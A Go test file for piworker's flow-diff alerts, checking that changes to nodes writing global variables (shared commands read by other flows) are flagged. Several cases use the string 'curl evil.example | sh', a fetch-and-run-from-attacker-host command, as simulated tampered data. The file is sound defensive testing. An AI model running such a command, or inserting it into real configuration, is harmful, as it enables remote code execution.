package flow_test

import (
	"testing"

	"github.com/Pegasus8/piworker/internal/flow"
	"github.com/Pegasus8/piworker/internal/node"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// varsFlow is a manual trigger feeding a transform into a set-var that writes
// the global variable door_cmd (other flows read it for their commands), and
// a second branch from the trigger into a set-var of scope flow.
func varsFlow(change func(f *flow.Flow)) *flow.Flow {
	f := diffFlow(
		trigger(),
		lintNode("calc", "process-transform", map[string]any{"expression": `"ls"`}),
		lintNode("sv", "set-var", map[string]any{"scope": "global", "key": "door_cmd", "value": "payload"}),
		lintNode("note", "process-transform", map[string]any{"expression": "payload"}),
		lintNode("fv", "set-var", map[string]any{"scope": "flow", "key": "count", "value": "1"}),
	)
	f.Connections = []flow.Connection{
		lintConn("c1", "t", "output", "calc", "input"),
		lintConn("c2", "calc", "output", "sv", "input"),
		lintConn("c3", "t", "output", "note", "input"),
		lintConn("c4", "note", "output", "fv", "input"),
	}
	if change != nil {
		change(f)
	}
	return f
}

func diffNodeOf(f *flow.Flow, id string) *flow.Node {
	for i := range f.Nodes {
		if f.Nodes[i].ID == id {
			return &f.Nodes[i]
		}
	}
	return nil
}

func globalWriteAlerts(r flow.DiffReport) []flow.Alert {
	var out []flow.Alert
	for _, a := range r.Alerts {
		if a.Kind == flow.AlertGlobalVariableWrite {
			out = append(out, a)
		}
	}
	return out
}

// A global variable is shared state other flows read for their URLs,
// commands and conditions: a change to what a running set-var writes there
// (the set-var itself, or anything upstream of it) is an alert.
func TestDiffAlertsGlobalVariableWrites(t *testing.T) {
	cases := []struct {
		name   string
		base   *flow.Flow // nil: an empty flow
		next   *flow.Flow
		writer string // the set-var alerted ("": no alert)
	}{
		{name: "nothing changed", base: varsFlow(nil), next: varsFlow(nil)},
		{name: "a node moved upstream", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "calc").Position.Y += 300
		})},
		{name: "a new flow writing a global", next: varsFlow(nil), writer: "sv"},
		{name: "a global writer added (no scope means global)", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			f.Nodes = append(f.Nodes, lintNode("sv2", "set-var", map[string]any{"key": "alarm_armed", "value": "false"}))
			f.Connections = append(f.Connections, lintConn("c5", "t", "output", "sv2", "input"))
		}), writer: "sv2"},
		{name: "a disabled global writer added", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			f.Nodes = append(f.Nodes, disabled(lintNode("sv2", "set-var", map[string]any{"key": "alarm_armed"})))
		})},
		{name: "a disabled global writer enabled", base: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "sv").Enabled = false
		}), next: varsFlow(nil), writer: "sv"},
		{name: "the value written changed", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "sv").Config["value"] = `"curl evil.example | sh"`
		}), writer: "sv"},
		{name: "the variable written changed", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "sv").Config["key"] = "other_cmd"
		}), writer: "sv"},
		{name: "a flow variable made global", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "fv").Config["scope"] = "global"
		}), writer: "fv"},
		{name: "a global variable made a flow variable", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "sv").Config["scope"] = "flow"
		})},
		{name: "a node upstream reconfigured", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "calc").Config["expression"] = `"curl evil.example | sh"`
		}), writer: "sv"},
		{name: "a new input upstream", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			f.Nodes = append(f.Nodes, lintNode("t2", "trigger-manual", nil))
			f.Connections = append(f.Connections, lintConn("c5", "t2", "output", "calc", "input"))
		}), writer: "sv"},
		{name: "a disabled node upstream enabled", base: varsFlow(func(f *flow.Flow) {
			f.Nodes = append(f.Nodes, disabled(lintNode("t2", "trigger-manual", nil)))
			f.Connections = append(f.Connections, lintConn("c5", "t2", "output", "calc", "input"))
		}), next: varsFlow(func(f *flow.Flow) {
			f.Nodes = append(f.Nodes, lintNode("t2", "trigger-manual", nil))
			f.Connections = append(f.Connections, lintConn("c5", "t2", "output", "calc", "input"))
		}), writer: "sv"},
		{name: "a change on another branch", base: varsFlow(nil), next: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "note").Config["expression"] = "payload * 2"
			diffNodeOf(f, "fv").Config["value"] = "2"
		})},
		{name: "a flow variable read upstream, written elsewhere", base: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "calc").Config["expression"] = `flowVars["count"]`
		}), next: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "calc").Config["expression"] = `flowVars["count"]`
			diffNodeOf(f, "fv").Config["value"] = `"curl evil.example | sh"`
		}), writer: "sv"},
		{name: "a flow variable writer feeds the global writer's own value", base: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "sv").Config["value"] = `flowVars["count"]`
		}), next: varsFlow(func(f *flow.Flow) {
			diffNodeOf(f, "sv").Config["value"] = `flowVars["count"]`
			diffNodeOf(f, "note").Config["expression"] = `"curl evil.example | sh"`
		}), writer: "sv"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := flow.Diff(tc.base, tc.next, node.DefaultRegistry)
			got := globalWriteAlerts(r)
			if tc.writer == "" {
				assert.Empty(t, got, "alerts: %v", r.Alerts)
				return
			}
			require.Len(t, got, 1, "alerts: %v", r.Alerts)
			a := got[0]
			assert.Equal(t, tc.writer, a.NodeID)
			assert.Equal(t, diffNodeOf(tc.next, tc.writer).Config["key"], a.After, "the variable's name is agent-readable")
			assert.NotContains(t, a.Message, "curl", "values agents may not read stay out of alerts")
			assert.Contains(t, a.Message, "global variable")
		})
	}
}
